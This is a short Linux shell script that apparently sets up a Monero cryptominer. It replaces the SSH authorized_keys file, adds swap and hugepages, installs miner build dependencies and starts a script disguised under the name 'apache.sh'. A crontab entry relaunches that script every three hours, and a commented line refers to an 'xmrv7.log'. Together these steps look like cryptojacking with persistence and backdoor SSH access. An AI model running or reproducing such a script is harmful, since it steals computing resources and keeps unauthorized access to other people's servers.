ufw allow 22/tcp
ufw --force enable
 
mv authorized_keys.txt ~/.ssh/authorized_keys
chmod 300  ~/.ssh/authorized_keys

dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
chmod 0600 /var/swap.img
mkswap /var/swap.img
swapon /var/swap.img

echo 128 > /proc/sys/vm/nr_hugepages

apt-get update
dpkg --configure -a
apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc
apt-get -y --force-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
cd 

wget https://api.ipify.org	

nohup sh /root/tanhuevon/apache.sh &
echo '0 */3 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -

#sleep 13
#tail -f ~/tanhuevon/xmrv7.log
